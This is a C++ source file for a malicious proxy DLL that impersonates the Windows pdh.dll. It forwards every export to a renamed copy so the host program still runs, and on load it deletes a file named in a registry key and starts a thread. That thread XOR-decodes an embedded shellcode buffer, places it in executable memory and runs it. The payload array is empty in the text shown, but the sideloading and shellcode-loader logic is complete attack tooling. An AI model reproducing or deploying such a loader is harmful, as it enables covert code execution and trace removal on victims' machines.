// DLL Proxy
#include <windows.h>
#include <Shellapi.h>
#include <tchar.h>
#include "pch.h"
#include <stdio.h>
#include <thread>
#include "direct.h"
#include <Shlobj.h>
#include <Shlwapi.h>

#pragma comment(linker, "/export:PdhAddCounterA=pdh1.PdhAddCounterA")
#pragma comment(linker, "/export:PdhAddCounterW=pdh1.PdhAddCounterW")
#pragma comment(linker, "/export:PdhAddEnglishCounterA=pdh1.PdhAddEnglishCounterA")
#pragma comment(linker, "/export:PdhAddEnglishCounterW=pdh1.PdhAddEnglishCounterW")
#pragma comment(linker, "/export:PdhAddRelogCounter=pdh1.PdhAddRelogCounter")
#pragma comment(linker, "/export:PdhBindInputDataSourceA=pdh1.PdhBindInputDataSourceA")
#pragma comment(linker, "/export:PdhBindInputDataSourceW=pdh1.PdhBindInputDataSourceW")
#pragma comment(linker, "/export:PdhBrowseCountersA=pdh1.PdhBrowseCountersA")
#pragma comment(linker, "/export:PdhBrowseCountersHA=pdh1.PdhBrowseCountersHA")
#pragma comment(linker, "/export:PdhBrowseCountersHW=pdh1.PdhBrowseCountersHW")
#pragma comment(linker, "/export:PdhBrowseCountersW=pdh1.PdhBrowseCountersW")
#pragma comment(linker, "/export:PdhCalculateCounterFromRawValue=pdh1.PdhCalculateCounterFromRawValue")
#pragma comment(linker, "/export:PdhCloseLog=pdh1.PdhCloseLog")
#pragma comment(linker, "/export:PdhCloseQuery=pdh1.PdhCloseQuery")
#pragma comment(linker, "/export:PdhCollectQueryData=pdh1.PdhCollectQueryData")
#pragma comment(linker, "/export:PdhCollectQueryDataEx=pdh1.PdhCollectQueryDataEx")
#pragma comment(linker, "/export:PdhCollectQueryDataWithTime=pdh1.PdhCollectQueryDataWithTime")
#pragma comment(linker, "/export:PdhComputeCounterStatistics=pdh1.PdhComputeCounterStatistics")
#pragma comment(linker, "/export:PdhConnectMachineA=pdh1.PdhConnectMachineA")
#pragma comment(linker, "/export:PdhConnectMachineW=pdh1.PdhConnectMachineW")
#pragma comment(linker, "/export:PdhCreateSQLTablesA=pdh1.PdhCreateSQLTablesA")
#pragma comment(linker, "/export:PdhCreateSQLTablesW=pdh1.PdhCreateSQLTablesW")
#pragma comment(linker, "/export:PdhEnumLogSetNamesA=pdh1.PdhEnumLogSetNamesA")
#pragma comment(linker, "/export:PdhEnumLogSetNamesW=pdh1.PdhEnumLogSetNamesW")
#pragma comment(linker, "/export:PdhEnumMachinesA=pdh1.PdhEnumMachinesA")
#pragma comment(linker, "/export:PdhEnumMachinesHA=pdh1.PdhEnumMachinesHA")
#pragma comment(linker, "/export:PdhEnumMachinesHW=pdh1.PdhEnumMachinesHW")
#pragma comment(linker, "/export:PdhEnumMachinesW=pdh1.PdhEnumMachinesW")
#pragma comment(linker, "/export:PdhEnumObjectItemsA=pdh1.PdhEnumObjectItemsA")
#pragma comment(linker, "/export:PdhEnumObjectItemsHA=pdh1.PdhEnumObjectItemsHA")
#pragma comment(linker, "/export:PdhEnumObjectItemsHW=pdh1.PdhEnumObjectItemsHW")
#pragma comment(linker, "/export:PdhEnumObjectItemsW=pdh1.PdhEnumObjectItemsW")
#pragma comment(linker, "/export:PdhEnumObjectsA=pdh1.PdhEnumObjectsA")
#pragma comment(linker, "/export:PdhEnumObjectsHA=pdh1.PdhEnumObjectsHA")
#pragma comment(linker, "/export:PdhEnumObjectsHW=pdh1.PdhEnumObjectsHW")
#pragma comment(linker, "/export:PdhEnumObjectsW=pdh1.PdhEnumObjectsW")
#pragma comment(linker, "/export:PdhExpandCounterPathA=pdh1.PdhExpandCounterPathA")
#pragma comment(linker, "/export:PdhExpandCounterPathW=pdh1.PdhExpandCounterPathW")
#pragma comment(linker, "/export:PdhExpandWildCardPathA=pdh1.PdhExpandWildCardPathA")
#pragma comment(linker, "/export:PdhExpandWildCardPathHA=pdh1.PdhExpandWildCardPathHA")
#pragma comment(linker, "/export:PdhExpandWildCardPathHW=pdh1.PdhExpandWildCardPathHW")
#pragma comment(linker, "/export:PdhExpandWildCardPathW=pdh1.PdhExpandWildCardPathW")
#pragma comment(linker, "/export:PdhFormatFromRawValue=pdh1.PdhFormatFromRawValue")
#pragma comment(linker, "/export:PdhGetCounterInfoA=pdh1.PdhGetCounterInfoA")
#pragma comment(linker, "/export:PdhGetCounterInfoW=pdh1.PdhGetCounterInfoW")
#pragma comment(linker, "/export:PdhGetCounterTimeBase=pdh1.PdhGetCounterTimeBase")
#pragma comment(linker, "/export:PdhGetDataSourceTimeRangeA=pdh1.PdhGetDataSourceTimeRangeA")
#pragma comment(linker, "/export:PdhGetDataSourceTimeRangeH=pdh1.PdhGetDataSourceTimeRangeH")
#pragma comment(linker, "/export:PdhGetDataSourceTimeRangeW=pdh1.PdhGetDataSourceTimeRangeW")
#pragma comment(linker, "/export:PdhGetDefaultPerfCounterA=pdh1.PdhGetDefaultPerfCounterA")
#pragma comment(linker, "/export:PdhGetDefaultPerfCounterHA=pdh1.PdhGetDefaultPerfCounterHA")
#pragma comment(linker, "/export:PdhGetDefaultPerfCounterHW=pdh1.PdhGetDefaultPerfCounterHW")
#pragma comment(linker, "/export:PdhGetDefaultPerfCounterW=pdh1.PdhGetDefaultPerfCounterW")
#pragma comment(linker, "/export:PdhGetDefaultPerfObjectA=pdh1.PdhGetDefaultPerfObjectA")
#pragma comment(linker, "/export:PdhGetDefaultPerfObjectHA=pdh1.PdhGetDefaultPerfObjectHA")
#pragma comment(linker, "/export:PdhGetDefaultPerfObjectHW=pdh1.PdhGetDefaultPerfObjectHW")
#pragma comment(linker, "/export:PdhGetDefaultPerfObjectW=pdh1.PdhGetDefaultPerfObjectW")
#pragma comment(linker, "/export:PdhGetDllVersion=pdh1.PdhGetDllVersion")
#pragma comment(linker, "/export:PdhGetExplainText=pdh1.PdhGetExplainText")
#pragma comment(linker, "/export:PdhGetFormattedCounterArrayA=pdh1.PdhGetFormattedCounterArrayA")
#pragma comment(linker, "/export:PdhGetFormattedCounterArrayW=pdh1.PdhGetFormattedCounterArrayW")
#pragma comment(linker, "/export:PdhGetFormattedCounterValue=pdh1.PdhGetFormattedCounterValue")
#pragma comment(linker, "/export:PdhGetLogFileSize=pdh1.PdhGetLogFileSize")
#pragma comment(linker, "/export:PdhGetLogFileTypeW=pdh1.PdhGetLogFileTypeW")
#pragma comment(linker, "/export:PdhGetLogSetGUID=pdh1.PdhGetLogSetGUID")
#pragma comment(linker, "/export:PdhGetRawCounterArrayA=pdh1.PdhGetRawCounterArrayA")
#pragma comment(linker, "/export:PdhGetRawCounterArrayW=pdh1.PdhGetRawCounterArrayW")
#pragma comment(linker, "/export:PdhGetRawCounterValue=pdh1.PdhGetRawCounterValue")
#pragma comment(linker, "/export:PdhIsRealTimeQuery=pdh1.PdhIsRealTimeQuery")
#pragma comment(linker, "/export:PdhLookupPerfIndexByNameA=pdh1.PdhLookupPerfIndexByNameA")
#pragma comment(linker, "/export:PdhLookupPerfIndexByNameW=pdh1.PdhLookupPerfIndexByNameW")
#pragma comment(linker, "/export:PdhLookupPerfNameByIndexA=pdh1.PdhLookupPerfNameByIndexA")
#pragma comment(linker, "/export:PdhLookupPerfNameByIndexW=pdh1.PdhLookupPerfNameByIndexW")
#pragma comment(linker, "/export:PdhMakeCounterPathA=pdh1.PdhMakeCounterPathA")
#pragma comment(linker, "/export:PdhMakeCounterPathW=pdh1.PdhMakeCounterPathW")
#pragma comment(linker, "/export:PdhOpenLogA=pdh1.PdhOpenLogA")
#pragma comment(linker, "/export:PdhOpenLogW=pdh1.PdhOpenLogW")
#pragma comment(linker, "/export:PdhOpenQuery=pdh1.PdhOpenQuery")
#pragma comment(linker, "/export:PdhOpenQueryA=pdh1.PdhOpenQueryA")
#pragma comment(linker, "/export:PdhOpenQueryH=pdh1.PdhOpenQueryH")
#pragma comment(linker, "/export:PdhOpenQueryW=pdh1.PdhOpenQueryW")
#pragma comment(linker, "/export:PdhParseCounterPathA=pdh1.PdhParseCounterPathA")
#pragma comment(linker, "/export:PdhParseCounterPathW=pdh1.PdhParseCounterPathW")
#pragma comment(linker, "/export:PdhParseInstanceNameA=pdh1.PdhParseInstanceNameA")
#pragma comment(linker, "/export:PdhParseInstanceNameW=pdh1.PdhParseInstanceNameW")
#pragma comment(linker, "/export:PdhReadRawLogRecord=pdh1.PdhReadRawLogRecord")
#pragma comment(linker, "/export:PdhRelogW=pdh1.PdhRelogW")
#pragma comment(linker, "/export:PdhRemoveCounter=pdh1.PdhRemoveCounter")
#pragma comment(linker, "/export:PdhResetRelogCounterValues=pdh1.PdhResetRelogCounterValues")
#pragma comment(linker, "/export:PdhSelectDataSourceA=pdh1.PdhSelectDataSourceA")
#pragma comment(linker, "/export:PdhSelectDataSourceW=pdh1.PdhSelectDataSourceW")
#pragma comment(linker, "/export:PdhSetCounterScaleFactor=pdh1.PdhSetCounterScaleFactor")
#pragma comment(linker, "/export:PdhSetCounterValue=pdh1.PdhSetCounterValue")
#pragma comment(linker, "/export:PdhSetDefaultRealTimeDataSource=pdh1.PdhSetDefaultRealTimeDataSource")
#pragma comment(linker, "/export:PdhSetLogSetRunID=pdh1.PdhSetLogSetRunID")
#pragma comment(linker, "/export:PdhSetQueryTimeRange=pdh1.PdhSetQueryTimeRange")
#pragma comment(linker, "/export:PdhTranslate009CounterW=pdh1.PdhTranslate009CounterW")
#pragma comment(linker, "/export:PdhTranslateLocaleCounterW=pdh1.PdhTranslateLocaleCounterW")
#pragma comment(linker, "/export:PdhUpdateLogA=pdh1.PdhUpdateLogA")
#pragma comment(linker, "/export:PdhUpdateLogFileCatalog=pdh1.PdhUpdateLogFileCatalog")
#pragma comment(linker, "/export:PdhUpdateLogW=pdh1.PdhUpdateLogW")
#pragma comment(linker, "/export:PdhValidatePathA=pdh1.PdhValidatePathA")
#pragma comment(linker, "/export:PdhValidatePathExA=pdh1.PdhValidatePathExA")
#pragma comment(linker, "/export:PdhValidatePathExW=pdh1.PdhValidatePathExW")
#pragma comment(linker, "/export:PdhValidatePathW=pdh1.PdhValidatePathW")
#pragma comment(linker, "/export:PdhVbAddCounter=pdh1.PdhVbAddCounter")
#pragma comment(linker, "/export:PdhVbCreateCounterPathList=pdh1.PdhVbCreateCounterPathList")
#pragma comment(linker, "/export:PdhVbGetCounterPathElements=pdh1.PdhVbGetCounterPathElements")
#pragma comment(linker, "/export:PdhVbGetCounterPathFromList=pdh1.PdhVbGetCounterPathFromList")
#pragma comment(linker, "/export:PdhVbGetDoubleCounterValue=pdh1.PdhVbGetDoubleCounterValue")
#pragma comment(linker, "/export:PdhVbGetLogFileSize=pdh1.PdhVbGetLogFileSize")
#pragma comment(linker, "/export:PdhVbGetOneCounterPath=pdh1.PdhVbGetOneCounterPath")
#pragma comment(linker, "/export:PdhVbIsGoodStatus=pdh1.PdhVbIsGoodStatus")
#pragma comment(linker, "/export:PdhVbOpenLog=pdh1.PdhVbOpenLog")
#pragma comment(linker, "/export:PdhVbOpenQuery=pdh1.PdhVbOpenQuery")
#pragma comment(linker, "/export:PdhVbUpdateLog=pdh1.PdhVbUpdateLog")
#pragma comment(linker, "/export:PdhVerifySQLDBA=pdh1.PdhVerifySQLDBA")
#pragma comment(linker, "/export:PdhVerifySQLDBW=pdh1.PdhVerifySQLDBW")
#pragma comment(linker, "/export:PdhWriteRelogSample=pdh1.PdhWriteRelogSample")


void Hook_Init();
std::thread hookthread;
char shellcode[] = \
	
;


BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH: {
		// Create a thread and close the handle as we do not want to use it to wait for it 
		// TODO: Remove after test
		HKEY hkey = NULL;
		LONG res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)"Software\\Classes\\87983e9e-fe92-11ed-be56-0242ac120002", 0, KEY_WRITE, &hkey);
		if (res == ERROR_SUCCESS) {
			char value[255] = { 0 };
			DWORD BufferSize = 255;
			RegGetValue(HKEY_CURRENT_USER, (LPCSTR)"Software\\Classes\\87983e9e-fe92-11ed-be56-0242ac120002", "4f3b5b6d-0aae-4f7f-8024-d906b12e7d4a", RRF_RT_ANY, NULL, (PVOID)&value, &BufferSize);
			Sleep(100);
			if (value[0] != 0) {
				remove(value);
				RegSetValueEx(hkey, (LPCSTR)"4f3b5b6d-0aae-4f7f-8024-d906b12e7d4a", 0, REG_SZ, NULL,NULL);
			}
			else {
			}
			RegCloseKey(hkey);
		}
		hookthread = std::thread(Hook_Init);
	}
	case DLL_PROCESS_DETACH:
		hookthread.detach();
		// Code to run when the DLL is freed
		break;

	case DLL_THREAD_ATTACH:
		// Code to run when a thread is created during the DLL's lifetime
		break;
	case DLL_THREAD_DETACH:
		// Code to run when a thread ends normally.
		break;
	}
	return TRUE;
}

void Hook_Init(){
	char key[] = "aeyp^cc9boQEoHdq";
	int keySize = sizeof(key);
	int i;
	for (i = 0; i < sizeof(shellcode); i++) {
		shellcode[i] = shellcode[i] ^ key[i % keySize];
	}
	void* pShellcode;
	HANDLE hProcess = GetCurrentProcess();

	pShellcode = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(pShellcode, shellcode, sizeof(shellcode));

	int (*func)();
	func = (int (*)()) pShellcode;
	(*func)();
}
